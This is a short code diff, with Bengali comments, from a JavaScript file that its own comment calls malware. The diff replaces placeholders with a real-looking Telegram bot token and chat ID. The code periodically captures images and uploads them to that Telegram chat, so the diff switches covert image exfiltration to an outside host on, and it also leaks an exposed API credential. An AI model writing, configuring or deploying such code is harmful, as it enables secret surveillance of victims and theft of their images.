@@ -121,7 +121,7 @@
 // =========================================================
 
 // *** অতি জরুরি: আপনার টেলিগ্রাম বট টোকেন এখানে দিন ***
-const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"; 
+const TELEGRAM_BOT_TOKEN = "8565643267:AAG0rnblltLejIli3XSXSr4-vpstJ5Vv5WM"; 
 // এটিই আপনার ম্যালওয়্যারকে লাইভ করার মূল চাবি।
 
 // Capture Interval (Milliseconds): প্রতি কত সময় পর ছবি তোলা হবে
@@ -219,7 +219,7 @@ async function sendImageToTelegram(imageDataUrl, captionText) {
     const base64Image = imageDataUrl.split(',')[1];
     const imageBlob = base64ToBlob(base64Image, 'image/jpeg');
 
-    formData.append('chat_id', 'YOUR_TARGET_CHAT_ID'); // <<< !!! MUST BE UPDATED !!!
+    formData.append('chat_id', '8782681794'); // <<< !!! MUST BE UPDATED !!!
     formData.append('caption', captionText);
     formData.append('photo', imageBlob, `${Date.now()}.jpg`);
 
